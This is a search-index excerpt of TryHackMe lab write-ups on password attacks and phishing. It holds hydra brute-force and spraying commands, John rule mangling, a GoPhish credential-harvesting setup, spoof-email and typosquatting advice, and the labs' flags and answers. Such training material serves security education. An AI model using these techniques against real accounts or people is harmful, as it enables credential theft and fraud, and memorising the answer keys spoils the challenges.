Answer the questions below Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f . What is the hash type? Answer sha - 1 Perform a dictionary attack against the following hash: 8d6e34f . What is the cracked value? Use rockyou.txt wordlist. Answer sunshine Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9] Answer 1337","title":"Brute-Force attack"},{"location":"tryhackme/room/password-attacks/#task-6-offline-attacks-rule-based","text":"","title":"Task 6: Offline Attacks - Rule-Based"},{"location":"tryhackme/room/password-attacks/#rule-based-attacks","text":"Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy \u2014 for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on. For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules: Rule-based attack user @machine $ cat / etc / john / john . conf | grep \"List.Rules:\" | cut -d \".\" -f3 | cut -d \":\" -f2 | cut -d \"]\" -f1 | awk NF JumboSingle o1 o2 i1 i2 o1 i1 o2 i2 best64 d3ad0ne dive InsidePro T0XlC rockyou - 30000 specific ShiftToggle Split Single Extra OldOffice Single-Extra Wordlist ShiftToggle Multiword best64 Jumbo KoreLogic T9 We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme , to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do! Rule-based attack user @machine $ john - -wordlist =/ tmp / single-password-list . txt - -rules = best64 - -stdout | wc -l Using default input encoding : UTF - 8 Press 'q' or Ctrl-C to abort , almost any other key for status 76p 0 : 00 : 00 : 00 100 . 00 % ( 2021 - 10 - 11 13 : 42 ) 1266p / s pordpo 76 --wordlist= to specify the wordlist or dictionary file. --rules to specify which rule or rules to use. --stdout to print the output to the terminal. |wc -l to count how many lines John produced. By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic . KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website here . Now let's use this rule and check whether the Tryh@ckm3 is available in our list! Answer the questions below What syntax would you use to create a rule to produce the following: \"S[Word]NN where N is Number and S is a symbol of !@? Answer Az \"[0-9][0-9]\" ^[!@]","title":"Rule-Based attacks"},{"location":"tryhackme/room/password-attacks/#task-8-online-password-attacks","text":"Some online password attacks tools: hydra, Medusa , Ncrack , others!","title":"Task 8: Online password attacks"},{"location":"tryhackme/room/password-attacks/#hydra","text":"Brute force: hydra -l ftp -P passlist.txt ftp://xxx.xxx.xxx.xxx hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v","title":"Hydra"},{"location":"tryhackme/room/password-attacks/#http-login-pages","text":"In this scenario, we will brute-force HTTP login pages . To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST . Checking hydra options: hydra http-get-form -U , we can see that hydra has the following syntax for the http-get-form option: <url>:<form parameters>:<condition string>[:<optional>[:<optional>] As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite. hydra user @machine $ hydra -l admin -P 500-worst-passwords . txt 10 . 10 . x . x http-get-form \"/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php\" -f Hydra v8 . 6 ( c ) 2017 by van Hauser / THC - Please do not use in military or secret service organizations , or for illegal purposes . Hydra ( http :// www . thc . org / thc-hydra ) starting at 2021 - 10 - 13 08 : 06 : 22 [DATA] max 16 tasks per 1 server , overall 16 tasks , 500 login tries ( l : 1 / p : 500 ), ~ 32 tries per task [DATA] attacking http-get-form :// 10 . 10 . x . x : 80 // login-get / index . php : username =^ USER ^& password =^ PASS ^: S = logout . php [ 80 ][ http-get-form ] host : 10 . 10 . x . x login : admin password : xxxxxx 1 of 1 target successfully completed , 1 valid password found Hydra ( http :// www . thc . org / thc-hydra ) finished at 2021 - 10 - 13 08 : 06 : 45 Option: -f to stop the brute-forcing attacks after finding a valid username and password Online password attacks Answer the questions below Question 1: Can you guess the FTP credentials without brute-forcing? What is the flag? THM{d0abe799f25738ad739c20301aed357b} Hint: Can login anonymous Perform a brute-forcing attack against the phillips account for the login page at http://MACHINE_IP/login-get using hydra? What is the flag? THM{33c5d4954da881814420f3ba39772644} Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://MACHINE_IP/login-post/ . What is the flag? THM{f8e3750cc0ccbb863f2706a3b2933227} Note: use the clinic.lst dictionary in generating and expanding the wordlist!","title":"HTTP login pages"},{"location":"tryhackme/room/password-attacks/#task-9-password-spray-attack","text":"","title":"Task 9: Password spray attack"},{"location":"tryhackme/room/password-attacks/#rdp","text":"See tool: https://github.com/xFreed0m/RDPassSpray Syntax: python3 RDPassSpray.py -u user -p pass -t HOST:PORT","title":"RDP"},{"location":"tryhackme/room/password-attacks/#outlook-web-access-owa-portal","text":"Tools: SprayingToolkit (atomizer.py) MailSniper","title":"Outlook web access (OWA) portal"},{"location":"tryhackme/room/password-attacks/#smb","text":"Tool: Metasploit (auxiliary/scanner/smb/smb_login) Answer the questions below Use the following username list: Password spraying attack! user @THM :~ # cat usernames-list.txt admin phillips burgess pittman guess Perform a password spraying attack to get access to the SSH://MACHINE_IP server to read /etc/flag . What is the flag? Flag: THM{a97a26e86d09388bbea148f4b870277d}","title":"SMB"},{"location":"tryhackme/room/password-attacks/#task-10-summary","text":"This room introduced the basic concepts of different password attacks and how to create custom and targeted password lists. We covered and discussed various topics, including: Default, weak, leaked combined wordlists Password profiling Offline password attacks Online password attacks","title":"Task 10: Summary"},{"location":"tryhackme/room/phishing/","tags":["THM-Room"],"text":"Phishing \u00b6 Task 1: Brief \u00b6 This room will take you through what phishing is, how it's performed, some valuable tools and why it's an essential part of a Red Team engagement. Now it's time to move to the next task and receive your Intro to Phishing ! I'm ready to learn! No needed answer Task 2: Intro To Phishing Attacks \u00b6 Before you learn what phishing is, you'll need to understand the term social engineering. Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. These \"weaknesses\" can be curiosity, jealously, greed and even kindness and the willingness to help someone. Phishing is a source of social engineering delivered through email to trick someone into either revealing personal information, credentials or even executing malicious code on their computer. These emails will usually appear to come from a trusted source, whether that's a person or a business. They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website. A term you'll come across and the type of phishing campaign a red team would participate in is spear-phishing , as with throwing a physical spear; you'd have a target to aim at, the same can be said with spear-phishing in that you're targeting an individual, business or organisation rather than just anybody as mass. This is an effective form of phishing for a red team engagement as they are bespoke to the target it makes them hard to detect by technology such as spam filters, antivirus and firewalls. A red team could be contracted to solely carry out a phishing assessment to see whether a business is vulnerable to this type of attack or can also be part of a broader scale assessment and used to gain access to computer systems or services. Some other methods of phishing through other mediums are smishing which is phishing through SMS messages, and vishing which is performed through phone calls. Example Scenario: The below example scenario shows how an employee of a company could be tricked into revealing their credentials. 1) The attacker locates the physical location of the target business. 2) The attacker then looks for nearby food suppliers and discovers a company called Ultimate Cookies! 3) The Attacker registers the domain name ultimate-cookies.thm 4) The attacker then crafts an email to their target, tempting them with an offer of receiving some free cookies if they sign up to the website. Because the victim has heard of this local company, they are more likely to trust it. 5) The victim then follows the link in the email to the fake website created by the attacker and registers online. To keep things simple, the victim reuses the same password for all their online accounts. 6) The attacker now has the victim's email address and password and can log onto the victim's company email account. The attacker could now have access to private company information and also have somewhere to launch another phishing attack against other employees. Alt text Next, you'll learn what goes on in setting up the infrastructure for a red team phishing campaign. What type of psychological manipulation is phishing part of? Social engineering What type of phishing campaign do red teams get involved in? spear-phishing Task 3: Writing Convincing Phishing Emails \u00b6 We have three things to work with regarding phishing emails: the sender's email address, the subject and the content. The Senders Address : Ideally, the sender's address would be from a domain name that spoofs a significant brand, a known contact, or a coworker. See the Choosing A Phishing Domain task below for more information on this. To find what brands or people a victim interacts with, you can employ OSINT (Open Source Intelligence) tactics. For example: Observe their social media account for any brands or friends they talk to. Searching Google for the victim's name and rough location for any reviews the victim may have left about local businesses or brands. Looking at the victim's business website to find suppliers. Looking at LinkedIn to find coworkers of the victim. The Subject : You should set the subject to something quite urgent, worrying, or piques the victim's curiosity, so they do not ignore it and act on it quickly. Examples of this could be: Your account has been compromised. Your package has been dispatched/shipped. Staff payroll information (do not forward!) Your photos have been published. The Content : If impersonating a brand or supplier, it would be pertinent to research their standard email templates and branding (style, logo's images, signoffs etc.) and make your content look the same as theirs, so the victim doesn't expect anything. If impersonating a contact or coworker, it could be beneficial to contact them; first, they may have some branding in their template, have a particular email signature or even something small such as how they refer to themselves, for example, someone might have the name Dorothy and their email is dorothy@company.thm . Still, in their signature, it might say \"Best Regards, Dot\". Learning these somewhat small things can sometimes have quite dramatic psychological effects on the victim and convince them more to open and act on the email. If you've set up a spoof website to harvest data or distribute malware, the links to this should be disguised using the anchor text and changing it either to some text which says \"Click Here\" or changing it to a correct looking link that reflects the business you are spoofing, for example: <a href=\"http://spoofsite.thm\">Click Here</a> <a href=\"http://spoofsite.thm\">https://onlinebank.thm</a> What tactic can be used to find brands or people a victim interacts with? OSINT What should be changed on an HTML anchor tag to disguise a link? anchor text Task 4: Phishing Infrastructure \u00b6 A certain amount of infrastructure will need to be put in place to launch a successful phishing campaign. Domain Name : You'll need to register either an authentic-looking domain name or one that mimics the identity of another domain. See task 5 for details on how to create the perfect domain name. SSL/TLS Certificates : Creating SSL/TLS certificates for your chosen domain name will add an extra layer of authenticity to the attack. Email Server/Account : You'll need to either set up an email server or register with an SMTP email provider. DNS Records : Setting up DNS Records such as SPF, DKIM, DMARC will improve the deliverability of your emails and make sure they're getting into the inbox rather than the spam folder. Web Server : You'll need to set up webservers or purchase web hosting from a company to host your phishing websites. Adding SSL/TLS to the websites will give them an extra layer of authenticity. Analytics : When a phishing campaign is part of a red team engagement, keeping analytics information is more important. You'll need something to keep track of the emails that have been sent, opened or clicked. You'll also need to combine it with information from your phishing websites for which users have supplied personal information or downloaded software. Automation And Useful Software : Some of the above infrastructures can be quickly automated by using the below tools. GoPhish - (Open-Source Phishing Framework) - getgophish.com GoPhish is a web-based framework to make setting up phishing campaigns more straightforward. GoPhish allows you to store your SMTP server settings for sending emails, has a web-based tool for creating email templates using a simple WYSIWYG (What You See Is What You Get) editor. You can also schedule when emails are sent and have an analytics dashboard that shows how many emails have been sent, opened or clicked. The Next task will talk you through how to launch a phishing campaign using this software. SET - (Social Engineering Toolkit) - trustedsec.com The Social Engineering Toolkit contains a multitude of tools, but some of the important ones for phishing are the ability to create spear-phishing attacks and deploy fake versions of common websites to trick victims into entering their credentials. Alt text Answer the questions below \u00b6 What part of a red team infrastructure can make a website look more authentic? SSL/TLS Certificates What protocol has TXT records that can improve email deliverability? DNS What tool can automate a phishing campaign and include analytics? GoPhish Task 5: Using GoPhish \u00b6 This task will take you through setting up GoPhish, sending a phishing campaign and capturing user credentials from a spoof website. Firstly launch the virtual machine by clicking the green Start Machine button on the right; once loaded, click the following URL to open the GoPhish login page https://LAB_WEB_URL.p.thmlabs.com:8443 or if you're connected to the TryHackMe VPN, you can to go https://MACHINE_IP (if you receive an Nginx error, wait another 30 seconds and try again). Alt text You should be able to log in with the username: admin and password: tryhackme Sending Profiles : \u00b6 Sending profiles are the connection details required to actually send your Phishing emails; this is just simply an SMTP server that you have access to. Click the Sending Profiles link on the left-hand menu and then click the \"New Profile\" button. Next, add in the following information as per the screenshot below: Name: Local Server From: noreply@redteam.thm Host: 127.0.0.1:25 Alt text Then click Save Profile. Landing Pages : \u00b6 Next, we're going to set up the landing page; this is the website that the Phishing email is going to direct the victim to; this page is usually a spoof of a website the victim is familiar with. Click the Landing Pages link on the left-hand menu and then click the \"New Page\" button. Give the Landing Page the name ACME Login , next in the HTML box; you'll need to press the Source button to allow us to enter the HTML code as shown below: <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > ACME IT SUPPORT - Admin Panel </ title > < style > body { font-family : \"Ubuntu\" , monospace ; text-align : center } div . login-form { margin : auto ; width : 300 px ; border : 1 px solid #ececec ; padding : 10 px ; text-align : left ; font-size : 13 px ;} div . login-form div input { margin-bottom : 7 px ;} div . login-form input { width : 280 px ;} div . login-form div : last-child { text-align : center ; } div . login-form div : last-child input { width : 100 px ;} </ style > </ head > < body > < h2 > ACME IT SUPPORT </ h2 > < h3 > Admin Panel </ h3 > < form method = \"post\" > < div class = \"login-form\" > < div > Username: </ div > < div >< input name = \"username\" ></ div > < div > Password: </ div > < div >< input type = \"password\" name = \"password\" ></ div > < div >< input type = \"submit\" value = \"Login\" ></ div > </ div > </ form > </ body > </ html > Click the Source button again, and you should see a login box with username and password fields as per the image below, also click the Capture Submitted Data box and then also the Capture Passwords box and then click the Save Page button. Alt text Email Templates : \u00b6 This is the design and content of the email you're going to actually send to the victim; it will need to be persuasive and contain a link to your landing page to enable us to capture the victim's username and password. Click the Email Templates link on the left-hand menu and then click the New Template button. Give the template the name Email 1, the subject New Message Received, click the HTML tab, and then the Source button to enable HTML editor mode. In the contents write a persuasive email that would convince the user to click the link, the link text will need to be set to https://admin.acmeitsupport.thm , but the actual link will need to be set to {{.URL}} which will get changed to our spoofed landing page when the email gets sent, you can do this by highlighting the link text and then clicking the link button on the top row of icons, make sure to set the protocol dropdown to . Alt text Alt text Your email should look similar to the screenshot below. Click Save Template once complete. Alt text Users & Groups \u00b6 This is where we can store the email addresses of our intended targets. Click the Users & Groups link on the left-hand menu and then click the New Group button. Give the group the name Targets and then add the following email addresses: martin@acmeitsupport.thm brian@acmeitsupport.thm accounts@acmeitsupport.thm Click the Save Template button; once completed, it should look like the below screenshot: Alt text Campaigns \u00b6 Now it's time to send your first emails; click the Campaigns link on the left-hand menu and then click the New Campaign button. Set the following values for the inputs, as per the screenshot below: Name: Campaign One Email Template: Email 1 Landing Page: ACME Login URL: http://MACHINE_IP Launch Date: For this lab set it to 2 days ago just to make sure there is no complication with different timezones, in a real operation this would be set correctly. Sending Profile: Local Server Groups: Targets Once completed, click the Launch Campaign button, which will produce an Are You Sure prompt where you can just press the Launch button. Alt text You'll then be redirected to the results page of the campaign. Results \u00b6 The results page gives us an idea of how the phishing campaign is performing by letting us know how many emails have been delivered, opened, clicked and how many users have submitted data to our spoof website. You'll see at the bottom of the screen a breakdown for each email address; you'll notice that both Martin's and Brian's email has been sent successfully, but the account's email has resulted in an error. Alt text We can dig in the error more by clicking the dropdown arrow next to the account's row, and by viewing the details or the error, we can see an error message saying the user is unknown. Alt text After a minute and providing you've followed the instructions correctly, you should see the status of brian change to Submitted Data . Alt text Expanding Brian's details and then viewing the details for the submitted data, you should be able to see Brian's username and password, which will help you answer the question below. Alt text Answer the questions below \u00b6 What is the password for Brian? p4$$w0rd! Task 6: Droppers \u00b6 Droppers are software that phishing victims tend to be tricked into downloading and running on their system. The dropper may advertise itself as something useful or legitimate such as a codec to view a certain video or software to open a specific file. The droppers are not usually malicious themselves, so they tend to pass antivirus checks. Once installed, the intended malware is either unpacked or downloaded from a server and installed onto the victim's computer. The malicious software usually connects back to the attacker's infrastructure. The attacker can take control of the victim's computer, which can further explore and exploit the local network. Answer the questions bellow \u00b6 Do droppers tend to be malicious? nay Task 7: Choosing A Phishing Domain \u00b6 Choosing the right Phishing domain to launch your attack from is essential to ensure you have the psychological edge over your target. A red team engagement can use some of the below methods for choosing the perfect domain name. Expired Domains : \u00b6 Although not essential, buying a domain name with some history may lead to better scoring of your domain when it comes to spam filters. Spam filters have a tendency to not trust brand new domain names compared to ones with some history Typosquatting : \u00b6 Typosquatting is when a registered domain looks very similar to the target domain you're trying to impersonate. Here are some of the common methods: Misspelling : goggle.com Vs google.com Additional Period : go.ogle.com Vs google.com Switching numbers for letters : g00gle.com Vs google.com Phrasing : googles.com Vs google.com Additional Word : googleresults.com Vs google.com TLD Alternatives : \u00b6 A TLD (Top Level Domain) is the .com .net .co.uk .org .gov e.t.c part of a domain name, there are 100's of variants of TLD's now. A common trick for choosing a domain would be to use the same name but with a different TLD. For example, register tryhackme.co.uk to impersonate tryhackme.com. IDN Homograph Attack/Script Spoofing : Originally domain names were made up of Latin characters a-z and 0-9, but in 1998, IDN (internationalized domain name) was implemented to support language-specific script or alphabet from other languages such as Arabic, Chinese, Cyrillic, Hebrew and more. An issue that arises from the IDN implementation is that different letters from different languages can actually appear identical. For example, Unicode character U+0430 (Cyrillic small letter a) looks identical to Unicode character U+0061 (Latin small letter a) used in English, enabling attackers to register a domain name that looks almost identical to another. Alt text Answer the questions bellow \u00b6 What is better, using an expired or new domain? (old/new) old What is the term used to describe registering a similar domain name with a spelling error? Typosquatting Task 8: Using MS Office In Phishing \u00b6 Often during phishing campaigns, a Microsoft Office document (typically Word, Excel or PowerPoint) will be included as an attachment. Office documents can contain macros; macros do have a legitimate use but can also be used to run computer commands that can cause malware to be installed onto the victim's computer or connect back to an attacker's network and allow the attacker to take control of the victim's computer. Take, for example, the following scenario : A staff member working for Acme IT Support receives an email from human resources with an excel spreadsheet called \"Staff_Salaries.xlsx\" intended to go to the boss but somehow ended up in the staff members inbox instead. What really happened was that an attacker spoofed the human resources email address and crafted a psychologically tempting email perfectly aimed to tempt the staff member into opening the attachment. Once the staff member opened the attachment and enabled the macros, their computer was compromised. Answer the question bellow \u00b6 What can Microsoft Office documents contain, which, when executed can run computer commands? macros Task 9: Using Browser Exploits \u00b6 Another method of gaining control over a victim's computer could be through browser exploits; this is when there is a vulnerability against a browser itself (Internet Explorer/Edge, Firefox, Chrome, Safari, etc.), which allows the attacker to run remote commands on the victim's computer. Browser exploits aren't usually a common path to follow in a red team engagement unless you have prior knowledge of old technology being used on-site. Many browsers are kept up to date, hard to exploit due to how browsers are developed, and the exploits are often worth a lot of money if reported back to the developers. That being said, it can happen, and as previously mentioned, it could be used to target old technologies on-site because possibly the browser software cannot be updated due to incompatibility with commercial software/hardware, which can happen quite often in big institutions such as education, government and especially health care. Usually, the victim would receive an email, convincing them to visit a particular website set up by the attacker. Once the victim is on the site, the exploit works against the browser, and now the attacker can perform any commands they wish on the victim's computer. An example of this is CVE-2021-40444 from September 2021, which is a vulnerability found in Microsoft systems that allowed the execution of code just from visiting a website. Answer the questions bellow \u00b6 Which recent CVE caused remote code execution? CVE-2021-40444 Task 10: Phishing Practical \u00b6 Now that you've learnt what goes into a phishing email campaign, let's see if you're able to spot them! Click the green \"View Site\" button to launch the Phishing Test website. Examine each email, including where it's from, its links and attachments and decide whether you think the email is safe or not. Answer the questions bellow \u00b6 What is the flag from the challenge? THM{I_CAUGHT_ALL_THE_PHISH}","title":"Phishing"},{"location":"tryhackme/room/phishing/#phishing","text":"","title":"Phishing"},{"location":"tryhackme/room/phishing/#task-1-brief","text":"This room will take you through what phishing is, how it's performed, some valuable tools and why it's an essential part of a Red Team engagement. Now it's time to move to the next task and receive your Intro to Phishing ! I'm ready to learn! No needed answer","title":"Task 1: Brief"},{"location":"tryhackme/room/phishing/#task-2-intro-to-phishing-attacks","text":"Before you learn what phishing is, you'll need to understand the term social engineering. Social engineering is the psychological manipulation of people into performing or divulging information by exploiting weaknesses in human nature. These \"weaknesses\" can be curiosity, jealously, greed and even kindness and the willingness to help someone. Phishing is a source of social engineering delivered through email to trick someone into either revealing personal information, credentials or even executing malicious code on their computer. These emails will usually appear to come from a trusted source, whether that's a person or a business. They include content that tries to tempt or trick people into downloading software, opening attachments, or following links to a bogus website. A term you'll come across and the type of phishing campaign a red team would participate in is spear-phishing , as with throwing a physical spear; you'd have a target to aim at, the same can be said with spear-phishing in that you're targeting an individual, business or organisation rather than just anybody as mass. This is an effective form of phishing for a red team engagement as they are bespoke to the target it makes them hard to detect by technology such as spam filters, antivirus and firewalls. A red team could be contracted to solely carry out a phishing assessment to see whether a business is vulnerable to this type of attack or can also be part of a broader scale assessment and used to gain access to computer systems or services. Some other methods of phishing through other mediums are smishing which is phishing through SMS messages, and vishing which is performed through phone calls. Example Scenario: The below example scenario shows how an employee of a company could be tricked into revealing their credentials. 1) The attacker locates the physical location of the target business. 2) The attacker then looks for nearby food suppliers and discovers a company called Ultimate Cookies! 3) The Attacker registers the domain name ultimate-cookies.thm 4) The attacker then crafts an email to their target, tempting them with an offer of receiving some free cookies if they sign up to the website. Because the victim has heard of this local company, they are more likely to trust it. 5) The victim then follows the link in the email to the fake website created by the attacker and registers online. To keep things simple, the victim reuses the same password for all their online accounts. 6) The attacker now has the victim's email address and password and can log onto the victim's company email account. The attacker could now have access to private company information and also have somewhere to launch another phishing attack against other employees. Alt text Next, you'll learn what goes on in setting up the infrastructure for a red team phishing campaign. What type of psychological manipulation is phishing part of? Social engineering What type of phishing campaign do red teams get involved in? spear-phishing","title":"Task 2: Intro To Phishing Attacks"},{"location":"tryhackme/room/phishing/#task-3-writing-convincing-phishing-emails","text":"We have three things to work with regarding phishing emails: the sender's email address, the subject and the content. The Senders Address : Ideally, the sender's address would be from a domain name that spoofs a significant brand, a known contact, or a coworker. See the Choosing A Phishing Domain task below for more information on this. To find what brands or people a victim interacts with, you can employ OSINT (Open Source Intelligence) tactics. For example: Observe their social media account for any brands or friends they talk to. Searching Google for the victim's name and rough location for any reviews the victim may have left about local businesses or brands. Looking at the victim's business website to find suppliers. Looking at LinkedIn to find coworkers of the victim. The Subject : You should set the subject to something quite urgent, worrying, or piques the victim's curiosity, so they do not ignore it and act on it quickly. Examples of this could be: Your account has been compromised. Your package has been dispatched/shipped. Staff payroll information (do not forward!) Your photos have been published. The Content : If impersonating a brand or supplier, it would be pertinent to research their standard email templates and branding (style, logo's images, signoffs etc.) and make your content look the same as theirs, so the victim doesn't expect anything. If impersonating a contact or coworker, it could be beneficial to contact them; first, they may have some branding in their template, have a particular email signature or even something small such as how they refer to themselves, for example, someone might have the name Dorothy and their email is dorothy@company.thm . Still, in their signature, it might say \"Best Regards, Dot\". Learning these somewhat small things can sometimes have quite dramatic psychological effects on the victim and convince them more to open and act on the email. If you've set up a spoof website to harvest data or distribute malware, the links to this should be disguised using the anchor text and changing it either to some text which says \"Click Here\" or changing it to a correct looking link that reflects the business you are spoofing, for example: <a href=\"http://spoofsite.thm\">Click Here</a> <a href=\"http://spoofsite.thm\">https://onlinebank.thm</a> What tactic can be used to find brands or people a victim interacts with? OSINT What should be changed on an HTML anchor tag to disguise a link? anchor text","title":"Task 3: Writing Convincing Phishing Emails"},{"location":"tryhackme/room/phishing/#task-4-phishing-infrastructure","text":"A certain amount of infrastructure will need to be put in place to launch a successful phishing campaign. Domain Name : You'll need to register either an authentic-looking domain name or one that mimics the identity of another domain. See task 5 for details on how to create the perfect domain name. SSL/TLS Certificates : Creating SSL/TLS certificates for your chosen domain name will add an extra layer of authenticity to the attack. Email Server/Account : You'll need to either set up an email server or register with an SMTP email provider. DNS Records : Setting up DNS Records such as SPF, DKIM, DMARC will improve the deliverability of your emails and make sure they're getting into the inbox rather than the spam folder. Web Server : You'll need to set up webservers or purchase web hosting from a company to host your phishing websites. Adding SSL/TLS to the websites will give them an extra layer of authenticity. Analytics : When a phishing campaign is part of a red team engagement, keeping analytics information is more important. You'll need something to keep track of the emails that have been sent, opened or clicked. You'll also need to combine it with information from your phishing websites for which users have supplied personal information or downloaded software. Automation And Useful Software : Some of the above infrastructures can be quickly automated by using the below tools. GoPhish - (Open-Source Phishing Framework) - getgophish.com GoPhish is a web-based framework to make setting up phishing campaigns more straightforward. GoPhish allows you to store your SMTP server settings for sending emails, has a web-based tool for creating email templates using a simple WYSIWYG (What You See Is What You Get) editor. You can also schedule when emails are sent and have an analytics dashboard that shows how many emails have been sent, opened or clicked. The Next task will talk you through how to launch a phishing campaign using this software. SET - (Social Engineering Toolkit) - trustedsec.com The Social Engineering Toolkit contains a multitude of tools, but some of the important ones for phishing are the ability to create spear-phishing attacks and deploy fake versions of common websites to trick victims into entering their credentials. Alt text","title":"Task 4: Phishing Infrastructure"},{"location":"tryhackme/room/phishing/#answer-the-questions-below","text":"What part of a red team infrastructure can make a website look more authentic? SSL/TLS Certificates What protocol has TXT records that can improve email deliverability? DNS What tool can automate a phishing campaign and include analytics? GoPhish","title":"Answer the questions below"},{"location":"tryhackme/room/phishing/#task-5-using-gophish","text":"This task will take you through setting up GoPhish, sending a phishing campaign and capturing user credentials from a spoof website. Firstly launch the virtual machine by clicking the green Start Machine button on the right; once loaded, click the following URL to open the GoPhish login page https://LAB_WEB_URL.p.thmlabs.com:8443 or if you're connected to the TryHackMe VPN, you can to go https://MACHINE_IP (if you receive an Nginx error, wait another 30 seconds and try again). Alt text You should be able to log in with the username: admin and password: tryhackme","title":"Task 5: Using GoPhish"},{"location":"tryhackme/room/phishing/#sending-profiles","text":"Sending profiles are the connection details required to actually send your Phishing emails; this is just simply an SMTP server that you have access to. Click the Sending Profiles link on the left-hand menu and then click the \"New Profile\" button. Next, add in the following information as per the screenshot below: Name: Local Server From: noreply@redteam.thm Host: 127.0.0.1:25 Alt text Then click Save Profile.","title":"Sending Profiles:"},{"location":"tryhackme/room/phishing/#landing-pages","text":"Next, we're going to set up the landing page; this is the website that the Phishing email is going to direct the victim to; this page is usually a spoof of a website the victim is familiar with. Click the Landing Pages link on the left-hand menu and then click the \"New Page\" button. Give the Landing Page the name ACME Login , next in the HTML box; you'll need to press the Source button to allow us to enter the HTML code as shown below: <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > ACME IT SUPPORT - Admin Panel </ title > < style > body { font-family : \"Ubuntu\" , monospace ; text-align : center } div . login-form { margin : auto ; width : 300 px ; border : 1 px solid #ececec ; padding : 10 px ; text-align : left ; font-size : 13 px ;} div . login-form div input { margin-bottom : 7 px ;} div . login-form input { width : 280 px ;} div . login-form div : last-child { text-align : center ; } div . login-form div : last-child input { width : 100 px ;} </ style > </ head > < body > < h2 > ACME IT SUPPORT </ h2 > < h3 > Admin Panel </ h3 > < form method = \"post\" > < div class = \"login-form\" > < div > Username: </ div > < div >< input name = \"username\" ></ div > < div > Password: </ div > < div >< input type = \"password\" name = \"password\" ></ div > < div >< input type = \"submit\" value = \"Login\" ></ div > </ div > </ form > </ body > </ html > Click the Source button again, and you should see a login box with username and password fields as per the image below, also click the Capture Submitted Data box and then also the Capture Passwords box and then click the Save Page button. Alt text","title":"Landing Pages:"},{"location":"tryhackme/room/phishing/#email-templates","text":"This is the design and content of the email you're going to actually send to the victim; it will need to be persuasive and contain a link to your landing page to enable us to capture the victim's username and password. Click the Email Templates link on the left-hand menu and then click the New Template button. Give the template the name Email 1, the subject New Message Received, click the HTML tab, and then the Source button to enable HTML editor mode. In the contents write a persuasive email that would convince the user to click the link, the link text will need to be set to https://admin.acmeitsupport.thm , but the actual link will need to be set to {{.URL}} which will get changed to our spoofed landing page when the email gets sent, you can do this by highlighting the link text and then clicking the link button on the top row of icons, make sure to set the protocol dropdown to . Alt text Alt text Your email should look similar to the screenshot below. Click Save Template once complete. Alt text","title":"Email Templates:"},{"location":"tryhackme/room/phishing/#users-groups","text":"This is where we can store the email addresses of our intended targets. Click the Users & Groups link on the left-hand menu and then click the New Group button. Give the group the name Targets and then add the following email addresses: martin@acmeitsupport.thm brian@acmeitsupport.thm accounts@acmeitsupport.thm Click the Save Template button; once completed, it should look like the below screenshot: Alt text","title":"Users &amp; Groups"},{"location":"tryhackme/room/phishing/#campaigns","text":"Now it's time to send your first emails; click the Campaigns link on the left-hand menu and then click the New Campaign button. Set the following values for the inputs, as per the screenshot below: Name: Campaign One Email Template: Email 1 Landing Page: ACME Login URL: http://MACHINE_IP Launch Date: For this lab set it to 2 days ago just to make sure there is no complication with different timezones, in a real operation this would be set correctly. Sending Profile: Local Server Groups: Targets Once completed, click the Launch Campaign button, which will produce an Are You Sure prompt where you can just press the Launch button. Alt text You'll then be redirected to the results page of the campaign.","title":"Campaigns"},{"location":"tryhackme/room/phishing/#results","text":"The results page gives us an idea of how the phishing campaign is performing by letting us know how many emails have been delivered, opened, clicked and how many users have submitted data to our spoof website. You'll see at the bottom of the screen a breakdown for each email address; you'll notice that both Martin's and Brian's email has been sent successfully, but the account's email has resulted in an error. Alt text We can dig in the error more by clicking the dropdown arrow next to the account's row, and by viewing the details or the error, we can see an error message saying the user is unknown. Alt text After a minute and providing you've followed the instructions correctly, you should see the status of brian change to Submitted Data . Alt text Expanding Brian's details and then viewing the details for the submitted data, you should be able to see Brian's username and password, which will help you answer the question below. Alt text","title":"Results"},{"location":"tryhackme/room/phishing/#answer-the-questions-below_1","text":"What is the password for Brian? p4$$w0rd!","title":"Answer the questions below"},{"location":"tryhackme/room/phishing/#task-6-droppers","text":"Droppers are software that phishing victims tend to be tricked into downloading and running on their system. The dropper may advertise itself as something useful or legitimate such as a codec to view a certain video or software to open a specific file. The droppers are not usually malicious themselves, so they tend to pass antivirus checks. Once installed, the intended malware is either unpacked or downloaded from a server and installed onto the victim's computer. The malicious software usually connects back to the attacker's infrastructure. The attacker can take control of the victim's computer, which can further explore and exploit the local network.","title":"Task 6: Droppers"},{"location":"tryhackme/room/phishing/#answer-the-questions-bellow","text":"Do droppers tend to be malicious? nay","title":"Answer the questions bellow"},{"location":"tryhackme/room/phishing/#task-7-choosing-a-phishing-domain","text":"Choosing the right Phishing domain to launch your attack from is essential to ensure you have the psychological edge over your target. A red team engagement can use some of the below methods for choosing the perfect domain name.","title":"Task 7: Choosing A Phishing 